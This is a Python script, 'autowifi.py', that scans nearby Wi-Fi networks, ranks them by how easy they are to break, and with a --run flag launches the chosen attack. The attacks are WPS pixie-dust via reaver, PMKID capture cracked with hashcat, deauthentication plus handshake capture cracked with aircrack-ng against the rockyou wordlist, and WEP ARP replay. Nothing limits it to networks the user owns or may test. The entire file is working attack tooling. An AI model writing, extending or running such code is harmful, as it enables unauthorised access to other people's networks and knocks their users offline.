#!/usr/bin/env python3
# language: Python 3.8+
# file: autowifi.py
# target: Alpine Linux (proot/Termux) + generic Linux — wifi recon + automatic attack picker
# deps:
#   Alpine:  apk add python3 iw wireless-tools aircrack-ng
#   Termux:  pkg install python termux-api
# usage:
#   python3 autowifi.py                 # detect + recommend (never touches the network)
#   python3 autowifi.py --run           # execute the best plan
#   python3 autowifi.py --target <bssid|ssid>
#   python3 autowifi.py --json
#   python3 autowifi.py --scan-json scan.json   # use a saved scan instead of scanning live
#   python3 autowifi.py --install       # install dependencies for the detected OS

import argparse, glob, json, os, re, shutil, subprocess, sys, time

__version__ = "0.3.0"

TOOLS = ["termux-wifi-scaninfo", "termux-wifi-connectioninfo", "iw", "iwlist", "nmcli",
         "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
         "wash", "reaver", "hcxdumptool", "hcxpcapngtool", "hashcat"]

# ---------------------------------------------------------------- helpers

def run(cmd, use_sudo=False, timeout=None, capture=True):
    if use_sudo and os.geteuid() != 0 and shutil.which("sudo"):
        cmd = ["sudo"] + cmd
    try:
        r = subprocess.run(cmd, timeout=timeout, capture_output=capture, text=True)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return 127, f"not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, "timeout"

def find_termux_bin(name):
    """Locate a Termux:API binary, including across the proot bind mounts."""
    tb = os.environ.get("TERMUX_BIN")
    cands = [
        os.path.join(tb, name) if tb else None,
        f"/opt/tbin/{name}",
        shutil.which(name),
        f"/data/data/com.termux/files/usr/bin/{name}",
        f"/data/data/com.termux/files/usr/library/bin/{name}",
        f"/tmp/termux/bin/{name}",
    ]
    for c in cands:
        if c and os.path.exists(c):
            return c
    return None

# ---------------------------------------------------------------- environment

def detect_env():
    env = {"tools": {}, "is_root": os.geteuid() == 0}
    termux_dir = os.path.isdir("/data/data/com.termux")
    env["termux"] = termux_dir or "com.termux" in os.environ.get("PREFIX", "")
    env["alpine"] = os.path.exists("/etc/alpine-release")
    env["pkg"] = "apk" if env["alpine"] else ("pkg" if env["termux"] else None)
    for t in TOOLS:
        env["tools"][t] = find_termux_bin(t)
    env["ifaces"] = wireless_ifaces()
    env["monitor_if"] = None
    for i in env["ifaces"]:
        cap = monitor_capable(i)
        env.setdefault("moncap", {})[i] = cap
        if cap and not env["monitor_if"]:
            env["monitor_if"] = i
    return env

def wireless_ifaces():
    """List wireless interfaces found under /sys/class/net."""
    out = []
    for d in sorted(glob.glob("/sys/class/net/*")):
        name = os.path.basename(d)
        if os.path.exists(os.path.join(d, "wireless")) or os.path.exists(os.path.join(d, "phy80211")):
            out.append(name)
    return out

def monitor_capable(iface):
    """True if the interface's phy advertises monitor mode. None if unknown."""
    phy = f"/sys/class/net/{iface}/phy80211/name"
    if os.path.exists(phy):
        try:
            name = open(phy).read().strip()
            rc, out = run(["iw", "phy", name, "info"])
            if rc == 0:
                return "monitor" in out
        except OSError:
            pass
    rc, out = run(["iw", "list"])
    return "monitor" in out if rc == 0 else None

# ---------------------------------------------------------------- scan

def freq_to_ch(f):
    """Convert a center frequency in MHz to its channel number."""
    if f == 2484: return 14
    if 2412 <= f <= 2472: return (f - 2407) // 5
    if 5180 <= f <= 5825: return (f - 5000) // 5
    if 5955 <= f <= 7115: return (f - 5950) // 5
    return 0

def scan(env):
    """Try each available scan backend and return (aps, backend_name)."""
    if env["tools"]["termux-wifi-scaninfo"]:
        aps = scan_termux(env)
        if aps: return aps, "termux-api"
    if env["tools"]["nmcli"]:
        aps = scan_nmcli()
        if aps: return aps, "nmcli"
    if env["tools"]["iw"] and env["is_root"]:
        aps = scan_iw(env)
        if aps: return aps, "iw"
    return [], None

def load_scan_json(path):
    """Read a saved scan (output of termux-wifi-scaninfo OR of --json).
    Lets you scan in native Termux and run classify/plan/crack inside Alpine."""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        data = json.load(f)
    if isinstance(data, dict) and "aps" in data:
        data = data["aps"]
    aps = []
    for n in data:
        aps.append({
            "ssid": n.get("ssid", ""),
            "bssid": str(n.get("bssid", "")).lower(),
            "ch": n.get("ch") or freq_to_ch(n.get("frequency", 0)) or 0,
            "signal": n.get("signal", n.get("level", 0)),
            "caps": n.get("caps") or n.get("capabilities", ""),
        })
    return aps

def scan_termux(env):
    rc, out = run([env["tools"]["termux-wifi-scaninfo"]])
    if rc != 0: return []
    try:
        data = json.loads(out or "[]")
    except json.JSONDecodeError:
        return []
    aps = []
    for n in data:
        aps.append({"ssid": n.get("ssid", ""), "bssid": n.get("bssid", "").lower(),
                    "ch": freq_to_ch(n.get("frequency", 0)),
                    "signal": n.get("level", 0), "caps": n.get("capabilities", "")})
    return aps

def scan_nmcli():
    rc, out = run(["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi"])
    if rc != 0: return []
    aps = []
    for line in out.splitlines():
        p = split_nmcli(line)
        if len(p) < 5: continue
        aps.append({"ssid": p[0], "bssid": p[1].lower().replace("\\", ""),
                    "ch": int(p[2]) if p[2].isdigit() else 0,
                    "signal": int(p[3]) if p[3].lstrip("-").isdigit() else 0,
                    "caps": p[4]})
    return aps

def split_nmcli(line):
    """Split an nmcli -t line on unescaped ':'."""
    parts, buf, i = [], "", 0
    while i < len(line):
        if line[i] == "\\" and i + 1 < len(line):
            buf += line[i + 1]; i += 2; continue
        if line[i] == ":":
            parts.append(buf); buf = ""; i += 1; continue
        buf += line[i]; i += 1
    parts.append(buf)
    return parts

def scan_iw(env):
    rc, out = run(["iw", "dev", env["ifaces"][0], "scan"], use_sudo=True) if env["ifaces"] else (1, "")
    if rc != 0: return []
    aps, cur = [], None
    for line in out.splitlines():
        m = re.match(r"BSS ([0-9a-f:]{17})", line)
        if m:
            cur = {"bssid": m.group(1), "ssid": "", "ch": 0, "signal": 0, "caps": ""}
            aps.append(cur); continue
        if cur is None: continue
        s = line.strip()
        if s.startswith("SSID:"):
            cur["ssid"] = s.split(":", 1)[1].strip()
        elif s.startswith("signal:"):
            cur["signal"] = int(float(s.split(":", 1)[1].split()[0]))
        elif s.startswith("DS Parameter set: channel"):
            cur["ch"] = int(re.search(r"channel (\d+)", s).group(1))
        elif s.startswith("primary channel:"):
            cur["ch"] = int(s.split(":", 1)[1].strip())
        elif "RSN:" in s or "WPA:" in s or "WEP" in s or "Privacy" in s:
            cur["caps"] += " " + s
        elif s.startswith("Authentication suites:"):
            cur["caps"] += " " + s
    return aps

# ---------------------------------------------------------------- classification + plan

def classify(ap):
    """Set ap['sec'] and ap['wps'] from the scan capabilities string."""
    c = ap["caps"].upper()
    if "SAE" in c or "WPA3" in c:      ap["sec"] = "wpa3"
    elif "WPA2" in c or "RSN" in c:    ap["sec"] = "wpa2"
    elif "WPA" in c:                   ap["sec"] = "wpa"
    elif "WEP" in c:                   ap["sec"] = "wep"
    elif "PRIVACY" in c:               ap["sec"] = "wep"
    else:                              ap["sec"] = "open"
    ap["wps"] = "WPS" in c or "WPS" in ap.get("ssid", "").upper()
    return ap

def plan_for(ap, env):
    """Pick an attack method + priority score for a single AP.
    Lower score = tried first. Open networks score last (nothing to crack)."""
    mon = env.get("monitor_if")
    T = env["tools"]
    if ap["wps"] and T["reaver"]:
        return {"score": 1, "method": "WPS pixie-dust (reaver)",
                "needs_monitor": True, "mon": mon}
    s = ap["sec"]
    if s == "wpa3":
        return {"score": 99, "method": "WPA3/SAE — out of scope", "needs_monitor": False, "mon": mon}
    if s in ("wpa2", "wpa"):
        if T["hcxdumptool"]:
            return {"score": 2, "method": "PMKID + hashcat", "needs_monitor": True, "mon": mon}
        return {"score": 2, "method": "handshake + aircrack", "needs_monitor": True, "mon": mon}
    if s == "wep":
        return {"score": 4, "method": "WEP arpreplay (aircrack)", "needs_monitor": True, "mon": mon}
    return {"score": 5, "method": "open network — connect directly", "needs_monitor": False, "mon": mon}

def rank(aps, env):
    """Classify every AP, attach a plan, and sort by (score, strongest signal)."""
    for a in aps:
        classify(a)
        a["plan"] = plan_for(a, env)
    return sorted(aps, key=lambda a: (a["plan"]["score"], -a["signal"]))

# ---------------------------------------------------------------- execution

def run_live(cmd, env, timeout=None):
    print("  $ " + " ".join(cmd))
    try:
        subprocess.run(((["sudo"] if (os.geteuid() != 0 and shutil.which("sudo")) else []) + cmd),
                       timeout=timeout)
    except KeyboardInterrupt:
        print("\n[!] interrupted")

def enable_monitor(env):
    """Put the monitor-capable interface into monitor mode and return its name."""
    if not env["monitor_if"]:
        return None
    iface = env["monitor_if"]
    if iface.endswith("mon") and os.path.exists(f"/sys/class/net/{iface}"):
        return iface
    if env["tools"]["airmon-ng"]:
        run(["airmon-ng", "check", "kill"], use_sudo=True)
        run(["airmon-ng", "start", iface], use_sudo=True)
        for cand in (iface + "mon", iface + "mon0", iface + "0"):
            if os.path.exists(f"/sys/class/net/{cand}"):
                return cand
        return iface + "mon"
    run(["ip", "link", "set", iface, "down"], use_sudo=True)
    run(["iw", iface, "set", "type", "monitor"], use_sudo=True)
    run(["ip", "link", "set", iface, "up"], use_sudo=True)
    return iface

def execute(ap, env):
    """Run the plan attached to a single AP."""
    plan = ap["plan"]
    print(f"\n[*] target: {ap['ssid'] or '<hidden>'}  {ap['bssid']}  ch{ap['ch']}  {ap['sec']}"
          + ("  WPS" if ap["wps"] else ""))
    print(f"[*] plan: {plan['method']}")

    if plan["needs_monitor"] and not env["monitor_if"]:
        print("[!] NO monitor-capable adapter in this environment.")
        print("    The internal Termux/Android radio cannot do monitor mode. You need:")
        print("      - a monitor-capable USB wifi adapter (AR9271 / RTL8812AU / MT7612U) + OTG")
        print("      - root (tsu) and the driver in monitor mode")
        print("    Alternative: capture on another PC and run only the cracker here (wpa_crack.py).")
        return

    if plan["method"].startswith("open network"):
        print("[*] open network — no password to recover. Just connect.")
        return

    mon = enable_monitor(env)
    print(f"[*] monitor interface: {mon}")
    T = env["tools"]

    if plan["method"].startswith("WPS"):
        run_live([T["reaver"], "-i", mon, "-b", ap["bssid"], "-c", str(ap["ch"]), "-K", "1", "-vv"], env)
        return

    if plan["method"].startswith("PMKID"):
        out = "/tmp/aw_pmkid"
        run_live([T["hcxdumptool"], "-i", mon, "-o", out + ".pcapng",
                  "--enable_status=1", "--filterlist_ap=" + ap["bssid"].replace(":", "")],
                 env, timeout=90)
        run(["hcxpcapngtool", "-o", out + ".hc22000", out + ".pcapng"])
        if T["hashcat"]:
            wl = first_wordlist()
            print(f"[*] cracking: hashcat -m 22000 {out}.hc22000 {wl}")
            run_live([T["hashcat"], "-m", "22000", out + ".hc22000", wl], env)
        else:
            print(f"[*] target saved: {out}.hc22000  → run hashcat -m 22000 on it")
        return

    if plan["method"].startswith("handshake"):
        bssid, ch = ap["bssid"], str(ap["ch"])
        cap = "/tmp/aw_hs"
        subprocess.Popen(((["sudo"] if os.geteuid() != 0 else []) +
                          [T["airodump-ng"], "-c", ch, "--bssid", bssid, "-w", cap, mon]))
        time.sleep(8)
        run_live([T["aireplay-ng"], "--deauth", "5", "-a", bssid, mon], env)
        time.sleep(20)
        run(["pkill", "airodump-ng"])
        wl = first_wordlist()
        run_live([T["aircrack-ng"], "-w", wl, "-b", bssid, cap + "-01.cap"], env)
        return

    if plan["method"].startswith("WEP"):
        bssid, ch = ap["bssid"], str(ap["ch"])
        cap = "/tmp/aw_wep"
        subprocess.Popen(((["sudo"] if os.geteuid() != 0 else []) +
                          [T["airodump-ng"], "-c", ch, "--bssid", bssid, "-w", cap, mon]))
        time.sleep(5)
        run_live([T["aireplay-ng"], "--arpreplay", "-b", bssid, mon], env, timeout=300)
        run(["pkill", "airodump-ng"])
        run_live([T["aircrack-ng"], cap + "-01.cap"], env)
        return

def first_wordlist():
    """Return the first wordlist that exists on disk, or a sane default."""
    for w in ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
              "/data/data/com.termux/files/usr/share/wordlists/rockyou.txt", "./rockyou.txt"]:
        if os.path.exists(w):
            return w
    return "rockyou.txt"

# ---------------------------------------------------------------- install

def install_deps(env):
    pkgs = ["python3", "iw", "wireless-tools", "aircrack-ng",
            "hcxdumptool", "hcxtools", "hashcat", "reaver", "wash"]
    if env["pkg"] == "apk":
        print("[*] apk add " + " ".join(pkgs))
        run(["apk", "add", "--no-cache"] + pkgs, use_sudo=True, capture=False)
    elif env["pkg"] == "pkg":
        print("[*] pkg install python termux-api")
        run(["pkg", "install", "-y", "python", "termux-api", "iw", "wireless-tools", "root-repo"], capture=False)
        run(["pkg", "install", "-y", "aircrack-ng", "hashcat"], capture=False)
    else:
        print("[!] Unrecognized OS (neither apk nor pkg). Install the dependencies manually.")

# ---------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser(description="wifi recon + automatic attack picker")
    ap.add_argument("--run", action="store_true", help="execute the best plan")
    ap.add_argument("--target", help="force a target by bssid or ssid")
    ap.add_argument("--json", action="store_true", help="print the ranked result as JSON")
    ap.add_argument("--scan-json", metavar="FILE",
                    help="use a saved scan (termux-wifi-scaninfo or --json) instead of scanning live")
    ap.add_argument("--install", action="store_true", help="install dependencies for the detected OS")
    ap.add_argument("--version", action="version", version=f"autowifi {__version__}")
    a = ap.parse_args()

    env = detect_env()
    if a.install:
        install_deps(env); return

    if not a.json:
        print(f"[*] environment: {'alpine ' if env['alpine'] else ''}{'termux ' if env['termux'] else ''}"
              f"root={'yes' if env['is_root'] else 'no'} "
              f"ifaces={env['ifaces'] or 'none'} "
              f"monitor={'yes' if env['monitor_if'] else 'NO'}")
        if env["monitor_if"] is None:
            print("[!] no monitor-capable adapter — live attack unavailable here.")

    aps, backend = (load_scan_json(a.scan_json), "json") if a.scan_json else scan(env)
    if not aps:
        print("[!] empty scan. Termux: install termux-api + the app, grant location permission. "
              "Linux: install nmcli/iw, or run as root.")
        return
    aps = rank(aps, env)
    if a.target:
        t = a.target.lower()
        aps = [x for x in aps if x["bssid"] == t or x["ssid"].lower() == t] or aps

    if a.json:
        print(json.dumps({"backend": backend, "monitor_if": env["monitor_if"], "aps": aps}, indent=2))
        return

    print(f"\n[*] {len(aps)} networks (scan via {backend}). plan per target:\n")
    hdr = f"{'SIG':>5}  {'CH':>3}  {'SEC':<5} {'WPS':<3} {'TARGET':<22} {'METHOD'}"
    print(hdr); print("-" * len(hdr))
    for x in aps:
        print(f"{x['signal']:>5}  {x['ch']:>3}  {x['sec']:<5} "
              f"{'yes' if x['wps'] else '-':<3} {(x['ssid'] or '<hidden>')[:22]:<22} {x['plan']['method']}")

    best = aps[0]
    print(f"\n[*] best option: {best['ssid'] or best['bssid']}  →  {best['plan']['method']}")

    if a.run:
        execute(best, env)
    else:
        print("[*] (dry-run) run with --run to execute. --target <bssid> forces another target.")


if __name__ == "__main__":
    main()
